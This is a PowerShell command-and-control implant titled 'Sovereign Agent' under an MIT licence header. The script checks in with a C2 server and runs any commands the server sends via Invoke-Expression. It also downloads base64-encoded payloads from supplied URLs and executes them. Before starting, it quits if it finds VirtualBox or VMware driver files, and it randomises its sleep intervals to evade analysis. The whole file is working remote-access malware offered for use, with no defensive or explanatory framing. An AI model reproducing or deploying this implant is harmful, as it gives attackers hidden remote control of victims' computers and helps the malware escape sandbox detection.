$MIT_LICENSE

# PowerShell script for Sovereign Agent

$C2Server = "http://192.168.1.100"  # Replace with the IP address of your C2 server
$AgentID = [guid]::NewGuid().ToString()

Function Encrypt-Data {
    param (
        [string]$Data
    )
    $Key = (Get-Content "C:\\path\\to\\encryption_key.txt")
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
    $EncryptedBytes = [System.Security.Cryptography.ProtectedData]::Protect($Bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    return [Convert]::ToBase64String($EncryptedBytes)
}

Function Decrypt-Data {
    param (
        [string]$Data
    )
    $Key = (Get-Content "C:\\path\\to\\encryption_key.txt")
    $Bytes = [Convert]::FromBase64String($Data)
    $DecryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($Bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    return [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
}

Function Write-Log {
    param (
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

Function Send-Data {
    param (
        [string]$Endpoint,
        [hashtable]$Data
    )
    $DataJson = $Data | ConvertTo-Json
    $EncryptedData = Encrypt-Data $DataJson
    $Url = "$C2Server/$Endpoint"
    $Response = Invoke-RestMethod -Uri $Url -Method Post -Body $EncryptedData -ContentType "application/json"
    return Decrypt-Data $Response
}

Function Execute-Command {
    param (
        [string]$Command
    )
    Write-Log "Executing command: $Command"
    try {
        $Result = Invoke-Expression $Command
        return $Result
    } catch {
        return $_.Exception.Message
    }
}

Function Check-Sandbox {
    # Check for common sandbox artifacts
    $sandbox_indicators = @("C:\\Windows\\System32\\drivers\\VBoxMouse.sys", "C:\\Windows\\System32\\drivers\\vmhgfs.sys")
    foreach ($indicator in $sandbox_indicators) {
        if (Test-Path $indicator) {
            Write-Log "Sandbox detected: $indicator" "Red"
            Exit
        }
    }
}

Function PolymorphicSleep {
    # Generate a polymorphic sleep interval
    $interval = Get-Random -Minimum 10 -Maximum 60
    Start-Sleep -Seconds $interval
}

Function Fetch-And-Execute-Payload {
    param (
        [string]$PayloadUrl
    )
    try {
        $Payload = Invoke-RestMethod -Uri $PayloadUrl -Method Get
        $DecodedPayload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Payload))
        Invoke-Expression $DecodedPayload
    } catch {
        Write-Log "Failed to fetch or execute payload: $_" "Red"
    }
}

Function Main {
    Write-Log "Agent started. ID: $AgentID" "Cyan"
    Check-Sandbox
    while ($true) {
        $Response = Send-Data "checkin" @{ "AgentID" = $AgentID }
        if ($Response.Command) {
            $Result = Execute-Command $Response.Command
            Send-Data "result" @{ "AgentID" = $AgentID; "Result" = $Result }
        }
        if ($Response.PayloadUrl) {
            Fetch-And-Execute-Payload $Response.PayloadUrl
        }
        PolymorphicSleep
    }
}

Main
